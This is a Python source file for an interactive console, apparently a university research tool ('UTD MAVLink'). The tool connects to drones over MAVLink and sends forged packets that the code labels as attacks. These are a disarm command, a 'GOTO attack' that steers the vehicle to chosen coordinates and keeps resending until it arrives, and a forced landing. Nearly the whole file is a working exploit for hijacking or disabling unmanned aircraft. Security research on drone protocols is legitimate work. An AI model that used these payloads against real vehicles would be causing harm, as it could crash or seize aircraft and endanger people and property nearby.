#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from mavlinkdissector import message_crc, dissect_mavlink
import os
import sys
import re
import socket
from binascii import hexlify
from contextlib import contextmanager
from threading import Thread
from struct import pack
from time import sleep, ctime, time
from cmd import Cmd
from math import radians, sin, cos, atan2, sqrt

ATK_RESULTS = {
    0: 'IDLE',
    1: 'WAITING',
    2: 'SUCCESS',
    3: 'FAILED',
}

@contextmanager
def quiet_out():
    with open(os.devnull, 'w') as devnull:
        oldout = sys.stdout
        sys.stdout = devnull
        try:
            yield
        finally:
            sys.stdout = oldout

def distance(lat1:float, lon1:float, lat2:float, lon2:float) -> float:
    '''Haversine formula'''
    R = float(6371000.0)
    phi1 = radians(lat1)
    phi2 = radians(lat2)
    deltaphi = radians(lat2 - lat1)
    deltalambda = radians(lon2 - lon1)
    alpha = sin(deltaphi / 2) ** 2 + cos(phi1) * cos(phi2) * (sin(deltalambda / 2) ** 2)
    c = 2 * atan2(sqrt(alpha), sqrt(1 - alpha))
    return float(R * c)

class mavlink_socket(Thread):

    def __init__(self, addr:str, port:int, s_type:str=None):
        Thread.__init__(self)
        self.__sock = None
        self.__addr = addr
        self.__port = port
        if s_type is None:
            self.__s_type = 'U'
        else:
            self.__s_type = s_type.upper()
        self.__last = None
        self.__message = None
        self.__terminate = False
        self.__comp_id = 0
        self.__sequence = 0
        self.__sys_id = 0
        self.__result = ATK_RESULTS[0]
        self.__gps_data = None
        self.__counter = 0
        self.__skip = False
        if self.__s_type == 'U':
            self.__sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.__sock.bind(('0.0.0.0', port))
            self.__sock.sendto(self.build_heartbeat(True), (self.__addr, self.__port))
        else:
            self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.__sock.connect((self.__addr, self.__port))
            self.__sock.send(self.build_heartbeat(True))
    
    def set_terminate(self):
        self.__terminate = True

    def get_last(self) -> bytes:
        return self.__last

    def get_gps(self) -> dict:
        return self.__gps_data

    def wait_result(self):
        self.__result = ATK_RESULTS[1]
    
    def set_idle(self):
        self.__result = ATK_RESULTS[0]

    def get_result(self) -> str:
        return self.__result

    def send_payload(self, data:bytes):
        if self.__s_type == 'U':
            self.__sock.sendto(data, (self.__addr, self.__port))
        else:
            self.__sock.send(data)

    def run(self):
        while not self.__terminate:
            try:
                if self.__sock is not None:
                    if self.__s_type == 'U':
                        self.__last = self.__sock.recv(270)
                    else:
                        mav_p = ord(self.__sock.recv(1))
                        while mav_p not in [0xfe, 0xfd, 0x55]:
                            mav_p = ord(self.__sock.recv(1))
                            if self.__skip and mav_p in [0x55, 0xfd, 0xfe]:
                                mav_p = 0x00
                                self.__skip = False
                        m_len = ord(self.__sock.recv(1))
                        if mav_p == 0xfd:
                            self.__last = pack('B',mav_p) + pack('B',m_len)
                            while len(self.__last) < m_len + 14:
                                self.__last += self.__sock.recv(1)
                        else:
                            self.__last = pack('B',mav_p) + pack('B',m_len)
                            while len(self.__last) < m_len + 8:
                                self.__last += self.__sock.recv(1)
                    with quiet_out():
                        self.__message = dissect_mavlink(self.__last)[0]
                    if type(self.__message) is dict and 'id' in self.__message.keys():
                        try:
                            self.__comp_id = self.__message['compid']
                            self.__sys_id = self.__message['sysid']
                        except KeyError:
                            pass
                        if self.__result == ATK_RESULTS[1] and self.__message['id'] == 77:
                            if type(self.__message['payload']) is dict and 'result' in self.__message['payload'].keys():
                                curr_res = self.__message['payload']['result']
                                if curr_res != 'MAV_RESULT_ACCEPTED':
                                    self.__result = ATK_RESULTS[3]
                                else:
                                    self.__result = ATK_RESULTS[2]
                                print(curr_res)
                            else:
                                print(self.__message)
                        elif self.__message['id'] == 33:
                            payload = self.__message['payload']
                            if 'alt' in payload.keys() and 'lat' in payload.keys() and 'lon' in payload.keys() and 'relative_alt' in payload.keys():
                                self.__gps_data = {}
                                self.__gps_data['lat'] = self.__message['payload']['lat']
                                self.__gps_data['lon'] = self.__message['payload']['lon']
                                self.__gps_data['alt'] = self.__message['payload']['alt']
                                self.__gps_data['rel_alt'] = self.__message['payload']['relative_alt']
                    if type(self.__message) is dict:
                        self.__skip = True
                    if (self.__counter % 500) == 0:
                        if self.__s_type == 'U':
                            self.__sock.sendto(self.build_heartbeat(False), (self.__addr, self.__port))
                        else:
                            self.__sock.send(self.build_heartbeat(False))
                self.__counter += 1
                if self.__counter == 2550:
                    self.__counter = 1
            except (TypeError, IOError):
                print('Connection lost')
                self.__sock.close()
                sys.exit(1)
        self.__sock.close()

    def build_heartbeat(self, initial:bool) -> bytes:
        p_sequence = self.__sequence                # Next sequence number
        self.__sequence += 1                        # Increase sequence
        if self.__sequence == 256:                  # Check sequence threshold
            self.__sequence = 0
        if initial:
            custom_mode = 0x00000000                # Initial state
            system_status = 0                       # MAV_STATE_UINIT
        else:
            custom_mode = 0xc0080600                # As set by qgroundcontrol
            system_status = 4                       # MAV_STATE_ACTIVE
        heartbeat = pack(
            '<BBBBBBBHBBBIBB',
            9,                                      # Payload length
            0x00,                                   # Required flags
            0x00,                                   # Optional flags
            p_sequence,                             # Packet sequence
            0xff,                                   # System ID
            0x00,                                   # Component ID
            0,                                      # Message ID: HEARTBEAT (0)
            0,                                      # MAVLink v2.0 message ID padding
            0,                                      # Type: MAV_TYPE_GENERIC (0)
            0,                                      # Autopilot: MAV_AUTOPILOT_GENERIC (0)
            0,                                      # Base mode: 0x00
            custom_mode,                            # Custom mode
            system_status,                          # System status
            3                                       # Version: 3 as specified by qgroundcontrol
        )
        crc = message_crc(heartbeat, 0)
        heartbeat = b'\xfd' + heartbeat             # MAVLink v 2.0
        heartbeat = heartbeat + pack('<H', crc)
        return heartbeat

    def build_disarm(self) -> bytes:
        p_sequence = self.__sequence            # Next sequence number
        self.__sequence += 1                    # Increase sequence
        if self.__sequence == 256:              # Check threshold
            self.__sequence = 0
        message = pack(
            '<BBBBBBBHBBHBIIIIIII',
            33,                                 # Payload length
            0x00,                               # Required flags
            0x00,                               # Optional flags
            p_sequence,                         # Packet sequence
            0xff,                               # System ID
            0x00,                               # Component ID
            76,                                 # Message ID: COMMAND_LONG (76)
            0,                                  # MAVLink 2.0 msgid padding
            0,                                  # Target system ID: 0x00
            0,                                  # Target component ID: 0x00
            0,                                  # Command: UNKNOWN (0)
            0,                                  # Confirmation: 0
            0x0046a598,                         # PARAM1: Fixed little-endian 98 a5 46 00
            0x00000000,                         # PARAM2: Unused
            0x00000000,                         # PARAM3: Unused
            0x00000000,                         # PARAM4: Unused
            0x00000000,                         # PARAM5: unused
            0x90000000,                         # PARAM6: Fixed little-endian 00 00 00 90
            0x00010101                          # PARAM7: Fixed little-endian 01 01 01 00
        )
        crc = message_crc(message, 76)
        message = b'\xfd' + message             # MAVLink v 2.0
        message = message + pack('<H', crc)
        return message

    def build_waypoint(self, lat:float, lon:float, alt:float) -> bytes:
        p_sequence = self.__sequence    # Next sequence number
        self.__sequence += 1            # Increase sequence
        if self.__sequence == 256:      # Check threshold
            self.__sequence = 0
        message = pack(
            '<BBBBBBBHBBHIIIfffI',
            32,                             # Length
            0,                              # Required flags
            0,                              # Optional flags
            p_sequence,                     # Packet sequence
            0xff,                           # System ID
            0,                              # Component ID: MAV_COMP_ID_ALL (0)
            76,                             # Message ID: COMMAND_LONG (76)
            0,                              # MAVLink 2.0 message ID little-endian padding
            0,                              # Command system
            0,                              # Command component
            49024,                          # Custom command (49024)
            0x3f800000,                     # PARAM1: Fixed little-endian 00 00 80 3f
            0x00000000,                     # PARAM2: Fixed little-endian 00 00 00 00
            0x7fc00000,                     # PARAM3: Fixed little-endian 00 00 c0 7f
            lat,                            # Latitude  [deg] (float)
            lon,                            # Longitude [deg] (float)
            alt,                            # Altitude  [m]   (float)
            0x010100c0                      # PARAM7: Fixed little-endian c0 00 01 01
        )
        crc = message_crc(message, 76)
        message = b'\xfd' + message         # MAVLink v 2.0
        message = message + pack('<H', crc)
        return message

    def __build_land(self) -> bytes:
        p_sequence = self.__sequence            # Next sequence number
        self.__sequence += 1                    # Increase sequence
        if self.__sequence == 256:              # Check threshold
            self.__sequence = 0
        message = pack(
            '<BBBBBBBHBBI',
            6,                                  # Payload length
            0x00,                               # Required flags
            0x00,                               # Optional flags
            p_sequence,                         # Packet sequence
            0xff,                               # System ID
            0x00,                               # Component ID: MAV_COMP_ID_ALL (0x00)
            11,                                 # Message ID: SET_MODE (11)
            0,                                  # MAVLink 2.0 message ID little-endian padding
            0x00,                               # Target system: 0x00
            0x00,                               # Base mode: MAV_MODE_PREFLIGHT (0) => "Land"
            0x9d010604                          # Custom mode: Fixed little-endian 04 06 01 9d
        )
        crc = message_crc(message, 11)
        message = b'\xfd' + message             # MAVLink v 2.0
        message = message + pack('<H', crc)
        return message

    def land(self):
        message = self.__build_land()
        self.send_payload(message)

class MavlinkPrompt(Cmd):

    CONN_REGEX = r'^(?P<ip_addr>(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)[.]){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d))\s+(?P<port>\d+)(?:\s+(?P<sock_type>[tT]|[uU]))?$'
    GOTO_REGEX = r'^(?P<lat>[-]?\d{1,3}[.]\d+)\s+(?P<lon>[-]?\d{1,3}[.]\d+)\s+(?P<alt>[-]?\d{1,3}(?:[.]\d+)?)$'
    LOGP_REGEX = r'^(?:[.]{0,2}/)*[^\0/]+(?:(?:/)?[^/\0]+)*?$'

    def __init__(self):
        Cmd.__init__(self)
        self.prompt = 'UTD MAVLink> '
        self.__mv_sock = None
        self.__msg = None
        self.__raw = None
        self.__curr_res = None
        self.__logfile = None

    def emptyline(self):
        pass

    def do_connect(self, args):
        '''
        Connect to a MAVLink device

        connect <IP address> <port> [socket type]

        The [socket type] can be either T for TCP or U for UDP. If no [socket type] is
        specified, a UDP socket is defined by default.

        If a previous connection was established, it is terminated prior to the new
        connection.
        '''
        c_info = re.match(MavlinkPrompt.CONN_REGEX, args)
        if c_info is not None:
            ip_addr = c_info.group('ip_addr')
            port = int(c_info.group('port'))
            if self.__mv_sock is not None:
                self.log('Closing existing MAVLink connection')
                self.__mv_sock.set_terminate()
                self.__mv_sock.join()
                self.__mv_sock = None
            self.log('Starting new MAVLink connection with {0:s}:{1:d}', ip_addr, port)
            if 'sock_type' in c_info.groupdict().keys():
                self.__mv_sock = mavlink_socket(ip_addr, port, c_info.group('sock_type'))
            else:
                self.__mv_sock = mavlink_socket(ip_addr, port)
            self.__mv_sock.start()
            self.log('MAVLink communication channel established')

    def do_disarm(self, args):
        '''Build and send a "DISARM" MAVLink message'''
        if self.__mv_sock is not None:
            attack = self.__mv_sock.build_disarm()
            if attack is not None:
                print('Attack message: 0x' + hexlify(attack).decode('utf-8'))
                self.__mv_sock.wait_result()
                self.log('Sending DISARM command')
                self.__mv_sock.send_payload(attack)
        else:
            print('Not connected to a MAVLink device')

    def do_goto(self, args):
        '''
        Build and send a waypoint message

        goto LAT LON ALT

        LAT     Latitude  [deg] (float)
        LON     Longitude [deg] (float)
        ALT     Altitude  [m]   (float)
        '''
        if self.__mv_sock is not None:
            g_info = re.match(MavlinkPrompt.GOTO_REGEX, args)
            if g_info is not None:
                t_lat = float(g_info.group('lat'))
                t_lon = float(g_info.group('lon'))
                t_alt = float(g_info.group('alt'))
                attack = self.__mv_sock.build_waypoint(t_lat, t_lon, t_alt)
                if attack is not None:
                    print('Attack message: 0x' + hexlify(attack).decode('utf-8'))
                    self.__mv_sock.send_payload(attack)
                    gps = self.__mv_sock.get_gps()
                    if gps is not None:
                        dist = 9999.0
                        last = None
                        delta = None
                        in_route = False
                        self.log('Starting GOTO attack.')
                        while dist > 0.5:
                            c_lat = float(gps['lat'])/1e7
                            c_lon = float(gps['lon'])/1e7
                            dist = distance(t_lat, t_lon, c_lat, c_lon)
                            gps = self.__mv_sock.get_gps()
                            self.log('Distance to target: {0:0.07f} m', dist)
                            sys.stdout.write('\rDistance to target: {0:0.07f} m'.format(dist) + ' '*10)
                            if last is not None:
                                delta = dist - last
                            last = dist
                            if delta is not None:
                                if not in_route and delta < 0:
                                    in_route = True
                                elif in_route and delta > 0:
                                    self.__mv_sock.send_payload(attack)
                                    in_route = False
                                    last = None
                            sleep(1)
                        self.log('Arrived within an acceptable range of target.')
                        print('\r\nArrived!\r\nLanding ...')
                        self.__mv_sock.land()
        else:
            print('Not connected to a MAVLink device')

    def do_read(self, args):
        '''Read the next available message from the MAVLink socket.'''
        if self.__mv_sock is not None:
            self.__raw = self.__mv_sock.get_last()
            with quiet_out():
                self.__msg = dissect_mavlink(self.__raw)
            if type(self.__msg) is list:
                self.__msg = self.__msg[0]
                print(self.__msg)
            else:
                print('Error - try again')
        else:
            print('Not connected to a MAVLink device.')
    
    def do_last(self, args):
        '''Show the last stored message'''
        if self.__msg is not None:
            print(self.__msg)
        else:
            print('Empty')

    def do_gps(self, args):
        '''Get the current GPS coordinates'''
        gps = self.__mv_sock.get_gps()
        if gps is None:
            print('Coordinates not yet received ...')
        else:
            print('LAT: {0:0.07f}\tLON: {1:0.07f}\tALT: {2:0.03f} m\tREL ALT: {3:0.03f} m'.format(float(gps['lat'])/1e7, float(gps['lon'])/1e7, float(gps['alt'])/1e3, float(gps['rel_alt'])/1e3))
            self.log('Current GPS coordinates :: LAT: {0:0.07f} LON: {1:0.07f} ALT: {2:0.03f} REL ALT: {3:0.03f}', float(gps['lat'])/1e7, float(gps['lon'])/1e7, float(gps['alt'])/1e3, float(gps['rel_alt'])/1e3)
    
    def do_openlog(self, args):
        if args is None or len(args) < 1:
            args = './logs/attk.log'
        p_info = re.match(MavlinkPrompt.LOGP_REGEX, args)
        if self.__logfile is None and p_info is not None and os.access(os.path.dirname(args), os.R_OK | os.W_OK) and os.path.exists(args) and os.path.isfile(args) and os.access(args, os.R_OK | os.W_OK):
            self.__logfile = open(args, mode='w+')
            print('Log file initialized.')
        elif self.__logfile is not None:
            print('Log file already opened.')
        elif p_info is None:
            print('Incorrect path.')
        elif os.path.isdir(args):
            print('The provided path is for a directory.')
        elif os.path.exists(args) and os.path.isfile(args) and not os.access(args, os.R_OK | os.W_OK):
            print('You do not have permissions to read/write in that file.')
        elif self.__logfile is None and p_info is not None and not os.path.exists(args) and os.path.exists(os.path.dirname(args)) and os.access(os.path.dirname(args), os.R_OK | os.W_OK):
            self.__logfile = open(args, mode='w+')
            print('Log file initialized.')
        else:
            print('The parent directory does not exist or you do not have permission to write into that directory.')
    
    def do_closelog(self, args):
        self.__logfile.close()
        self.__logfile = None

    def do_EOF(self, args):
        sys.stdout.write('\r\n')
        return self.do_exit(None)

    def do_exit(self, args):
        if self.__mv_sock is not None:
            self.__mv_sock.set_terminate()
            self.__mv_sock.join()
        if self.__logfile is not None:
            self.__logfile.close()
        return True
 
    def log(self, pattern:str, *args):
        if self.__logfile is not None:
            line = ctime(time())
            line += ' ' + os.uname()[1] + ' utdmavlink: '
            line += pattern.format(*args)
            line += '\r\n'
            self.__logfile.write(line)

if __name__ == '__main__':
    try:
        pmp = MavlinkPrompt()
        pmp.cmdloop()
    except KeyboardInterrupt:
        sys.stdout.write('\r\n')
        pmp.do_exit(None)
